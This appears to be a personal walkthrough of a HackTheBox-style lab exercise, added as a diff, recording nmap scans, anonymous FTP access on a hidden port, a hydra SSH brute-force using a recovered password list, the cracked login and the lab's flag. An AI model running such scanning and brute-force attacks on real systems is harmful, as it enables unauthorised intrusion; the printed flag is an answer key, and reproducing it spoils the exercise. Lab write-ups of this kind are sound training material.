@@ -1,1 +1,102 @@
 
+Attacking Common Services - Medium
+The second server is an internal server (within the inlanefreight.htb domain) that manages and stores emails and files and serves as a backup of some of the company's processes. 
+From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.
+
+Question - Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.
+
+1) sudo nmap -sCV -A 10.129.201.127
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 14:52 CST
+Nmap scan report for 10.129.201.127
+Host is up (0.0087s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
+|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
+|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
+53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+110/tcp  open  pop3     Dovecot pop3d
+|_pop3-capabilities: AUTH-RESP-CODE TOP PIPELINING SASL(PLAIN) RESP-CODES STLS CAPA UIDL USER
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=ubuntu
+| Subject Alternative Name: DNS:ubuntu
+| Not valid before: 2022-04-11T16:38:55
+|_Not valid after:  2032-04-08T16:38:55
+995/tcp  open  ssl/pop3 Dovecot pop3d
+|_pop3-capabilities: AUTH-RESP-CODE SASL(PLAIN) USER PIPELINING TOP CAPA UIDL RESP-CODES
+| ssl-cert: Subject: commonName=ubuntu
+| Subject Alternative Name: DNS:ubuntu
+| Not valid before: 2022-04-11T16:38:55
+|_Not valid after:  2032-04-08T16:38:55
+|_ssl-date: TLS randomness does not represent time
+2121/tcp open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (InlaneFTP) [10.129.201.127]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+
+2) tried to log into ftp on 2121 and got denied... 
+3) after trying to enumerate and  brute force other   services  we talk  a   jog and come back -> re run nmap for ALL ports -> 
+	nmap -Pn -p- 10.129.201.127
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 14:57 CST
+Nmap scan report for 10.129.201.127
+Host is up (0.0098s latency).
+Not shown: 65529 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+53/tcp    open  domain
+110/tcp   open  pop3
+995/tcp   open  pop3s
+2121/tcp  open  ccproxy-ftp
+30021/tcp open  unknown
+
+4) peek and poke and new port - nmap -sV -p30021 10.129.201.127 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 15:06 CST
+Nmap scan report for 10.129.201.127
+Host is up (0.0086s latency).
+
+PORT      STATE SERVICE VERSION
+30021/tcp open  ftp
+
+
+5) ftp so lets try to just log in with anonymous: 
+ftp 10.129.201.127 -p 30021 
+anonymous
+logged in successfully 
+ls -lah 
+cd simon 
+ls -lah 
+get mynotes.txt
+6) on host machine -> cat mynotes.txt 
+234987123948729384293
++23358093845098
+ThatsMyBigDog
+Rock!ng#May
+Puuuuuh7823328
+8Ns8j1b!23hs4921smHzwn
+237oHs71ohls18H127!!9skaP
+238u1xjn1923nZGSb261Bs81
+9) looks like a password list frfr so... lets try to use simon as the user and this list as the passlist for one of the prior services, start at top of the service list with ssh 
+10) hydra -l simon -P mynotes.txt -f 10.129.201.127 ssh
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-01 15:15:03
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
+[DATA] attacking ssh://10.129.201.127:22/
+[22][ssh] host: 10.129.201.127   login: simon   password: 8Ns8j1b!23hs4921smHzwn
+
+simon:8Ns8j1b!23hs4921smHzwn
+11) ssh simon@10.129.201.127 
+12) enter password 
+13) ls -lah
+14) cat flag.txt - HTB{1qay2wsx3EDC4rfv_M3D1UM} 
+
+
+
+
